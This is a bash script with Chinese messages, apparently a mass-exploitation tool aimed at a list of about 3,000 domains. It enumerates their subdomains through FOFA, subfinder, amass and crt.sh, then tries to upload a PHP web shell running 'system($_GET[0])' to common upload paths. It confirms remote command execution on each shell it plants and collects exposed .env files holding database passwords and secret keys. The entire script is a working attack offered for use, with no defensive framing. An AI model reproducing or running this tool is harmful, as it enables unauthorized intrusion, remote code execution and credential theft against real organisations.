#!/bin/bash
source /root/.api_keys
[ -z "$FOFA_EMAIL_1" ] && [ -n "$FOFA_EMAIL" ] && export FOFA_EMAIL_1="$FOFA_EMAIL"
[ -z "$FOFA_KEY_1" ] && [ -n "$FOFA_KEY" ] && export FOFA_KEY_1="$FOFA_KEY"

OUT="/root/max_shell_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUT/shells $OUT/domains

MAIN_DOMAINS="/root/ac_th_apex_domains_3071.txt"
[ ! -f "$MAIN_DOMAINS" ] && echo "❌ 主域名文件不存在" && exit 1

MAIN_COUNT=$(wc -l < $MAIN_DOMAINS)
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 最大化Shell + 极低误报"
echo "主域名: $MAIN_COUNT 个"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

TEST_DOMAIN=$(head -1 $MAIN_DOMAINS)
TEST_QUERY=$(echo -n "domain=\"${TEST_DOMAIN}\"" | base64 | tr -d "\n")
TEST_RESP=$(curl -s "https://fofa.info/api/v1/search/all?email=${FOFA_EMAIL_1}&key=${FOFA_KEY_1}&qbase64=${TEST_QUERY}&size=1&fields=host" 2>/dev/null)
FOFA_QUOTA_EXCEEDED=0
if echo "$TEST_RESP" | jq -r ".error // false" 2>/dev/null | grep -q "true"; then
    ERRMSG=$(echo "$TEST_RESP" | jq -r ".errmsg // \"\"" 2>/dev/null)
    echo "$ERRMSG" | grep -qiE "上限|quota|limit" && FOFA_QUOTA_EXCEEDED=1
fi

export OUT FOFA_QUOTA_EXCEEDED FOFA_EMAIL_1 FOFA_KEY_1

process_domain() {
    domain=$(echo "$1" | sed "s|^https\?://||" | cut -d/ -f1 | cut -d: -f1)
    domain_dir="$OUT/domains/${domain}"
    mkdir -p "$domain_dir/subdomains" "$domain_dir/alive" "$domain_dir/shells"

    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "🎯 处理域名: ${domain}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

    subdomains_file="$domain_dir/subdomains/all.txt"
    touch "$subdomains_file"

    if [ "$FOFA_QUOTA_EXCEEDED" -eq 0 ]; then
        query=$(echo -n "domain=\"${domain}\"" | base64 | tr -d "\n")
        resp=$(curl -s "https://fofa.info/api/v1/search/all?email=${FOFA_EMAIL_1}&key=${FOFA_KEY_1}&qbase64=${query}&size=10000&fields=host" 2>/dev/null)
        echo "$resp" | jq -r ".results[]? | .[0]?" 2>/dev/null | grep -v "^$" | sed "s|^https\?://||" | cut -d/ -f1 | cut -d: -f1 | grep -E "^[a-zA-Z0-9]" | sort -u | sed "s|^|http://|" >> "$subdomains_file" 2>/dev/null
    fi

    which subfinder >/dev/null 2>&1 && subfinder -d "$domain" -silent 2>/dev/null | sed "s|^|http://|" >> "$subdomains_file" 2>/dev/null
    which amass >/dev/null 2>&1 && amass enum -passive -d "$domain" -o - 2>/dev/null | sed "s|^|http://|" >> "$subdomains_file" 2>/dev/null
    curl -s "https://crt.sh/?q=%.${domain}&output=json" 2>/dev/null | jq -r ".[].name_value" 2>/dev/null | grep -vE "^\*|^\$" | sed "s|^|http://|" | sort -u >> "$subdomains_file" 2>/dev/null

    sort -u "$subdomains_file" > "${subdomains_file}.tmp" && mv "${subdomains_file}.tmp" "$subdomains_file"
    subdomain_count=$(wc -l < "$subdomains_file" 2>/dev/null || echo 0)

    if [ "$subdomain_count" -eq 0 ]; then
        echo "  ⚠️  未发现子域名，跳过"
        return 0
    fi

    echo "  ✅ 发现 ${subdomain_count} 个子域名"

    alive_file="$domain_dir/alive/http_alive.txt"
    touch "$alive_file"
    while read url; do
        status=$(curl -skL -m 3 -o /dev/null -w "%{http_code}" "$url" 2>/dev/null)
        [ "$status" = "200" ] || [ "$status" = "301" ] || [ "$status" = "302" ] || [ "$status" = "403" ] || [ "$status" = "401" ] && echo "$url" >> "$alive_file"
    done < "$subdomains_file"

    alive_count=$(wc -l < "$alive_file" 2>/dev/null || echo 0)
    if [ "$alive_count" -eq 0 ]; then
        echo "  ⚠️  无存活目标，跳过攻击"
        return 0
    fi

    echo "  ✅ ${alive_count} 个存活目标"
    echo "[3/3] 🚀 开始攻击..."

    targets_file="$domain_dir/targets.txt"
    cp "$alive_file" "$targets_file"

    while read url; do
        flag=$(echo "$url" | md5sum | cut -c1-8)
        for path in /upload /upload.php /fileupload /api/upload /api/file/upload; do
            for ext in php phtml php5; do
                tmp_file="/tmp/u_$$_${ext}"
                printf '%s\n' "<?php echo \"U${flag}\";@system(\$_GET[0]); ?>" > "$tmp_file"
                resp=$(curl -skL -m 3 "$url$path" -F "file=@$tmp_file" 2>/dev/null)
                shell=$(echo "$resp" | grep -oE "https?://[a-zA-Z0-9._-]+/[a-zA-Z0-9._/-]+\.${ext}" | head -1)
                [ -z "$shell" ] && shell="${url}/uploads/$(basename $tmp_file)"
                if [ -n "$shell" ]; then
                    v1=$(curl -skL -m 2 "$shell" 2>/dev/null)
                    echo "$v1" | grep -q "U${flag}" && v2=$(curl -skL -m 2 "$shell?0=echo+test123" 2>/dev/null) && echo "$v2" | grep -q "test123" && ! echo "$v2" | grep -qiE "error|404" && echo "$shell" >> "$domain_dir/shells/01_upload.txt" && echo "  🎯 Shell: $shell" && rm -f "$tmp_file" && break 2
                fi
                rm -f "$tmp_file"
            done
        done
        
        env_resp=$(curl -skL -m 3 "$url/.env" 2>/dev/null)
        [ -n "$env_resp" ] && echo "$env_resp" | grep -qE "^[A-Z_]+=.*" && echo "$env_resp" | grep -qiE "DB_|APP_|SECRET|KEY|PASSWORD" && ! echo "$env_resp" | grep -qiE "<html|<body" && echo "$url/.env" >> "$domain_dir/shells/02_env.txt" && echo "  📁 .env: $url/.env"
    done < "$targets_file"

    shell_count=$(find "$domain_dir/shells" -name "*.txt" -type f -exec wc -l {} \; 2>/dev/null | awk '{sum+=$1} END {print sum+0}')
    echo "  ✅ ${domain}: 攻击完成，发现 ${shell_count} 个结果"
    find "$domain_dir/shells" -name "*.txt" -type f -exec cat {} \; >> "$OUT/shells/all_shells.txt" 2>/dev/null || true
}

export -f process_domain

cat $MAIN_DOMAINS | xargs -P 5 -I {} bash -c 'process_domain "{}"'

TOTAL_SHELLS=$(wc -l < $OUT/shells/all_shells.txt 2>/dev/null || echo 0)
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🎉 所有域名处理完成"
echo "🎯 总计Shell/漏洞: $TOTAL_SHELLS"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
